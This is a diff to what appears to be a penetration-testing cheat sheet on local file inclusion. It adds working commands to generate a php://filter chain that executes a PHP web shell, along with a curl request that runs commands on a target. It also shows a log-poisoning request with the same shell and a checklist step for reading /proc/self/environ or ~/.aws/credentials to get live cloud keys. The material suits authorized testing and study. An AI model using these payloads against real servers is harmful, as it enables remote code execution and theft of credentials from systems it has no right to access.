@@ -97,9 +97,9 @@ GET /<?php system($_GET['c']); ?> HTTP/1.1
 ## 7. LFI → RCE: php://filter chain (no file write) (Guide §12)
 
 ```bash
-# generate a chain that makes the include execute <?php system($_GET[c]);?>
-python3 poc/filter_chain_rce.py --cmd 'system($_GET["c"]);' > chain.txt
-# or synacktiv:
+# generate a WORKING chain (poc/filter_chain_rce.py drives synacktiv's generator; auto-detected or --generator <path>):
+python3 poc/filter_chain_rce.py --payload '<?php system($_GET["c"]); ?>'    # prints the php://filter chain
+# or call synacktiv directly (its stdout IS just the chain):
 python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>' > chain.txt
 curl -s "https://target/?page=$(cat chain.txt)&c=id"
 ```
@@ -238,8 +238,10 @@ theme / template / locale / avatar-path / filename =  ../../../../etc/passwd
 □ LFI → cloud takeover: read /proc/self/environ or ~/.aws/credentials → live keys (validate read-only, SSRF kit §11).
 ```
 > **References:** PortSwigger *File path traversal* & *File inclusion*, PayloadsAllTheThings *File Inclusion* &
-> *Directory Traversal*, HackTricks *LFI/RFI* & *LFI2RCE*, `synacktiv/php_filter_chain_generator`, LFISuite/liffy,
-> Hackviser & PentesterLab LFI modules.
+> *Directory Traversal*, HackTricks *LFI/RFI* & *LFI2RCE*, The Hacker Recipes *File inclusion*, loknop's original
+> *php filter chains* gist + `synacktiv/php_filter_chain_generator` (§7/§12), Orange Tsai *Breaking Parser Logic*
+> (§10d proxy/path traversal), Assetnote *Apache CVE-2021-41773* deep-dive, LFISuite/liffy, PentesterLab.
+> (Full categorized link list: guide Appendix C.)
 
 ---
 
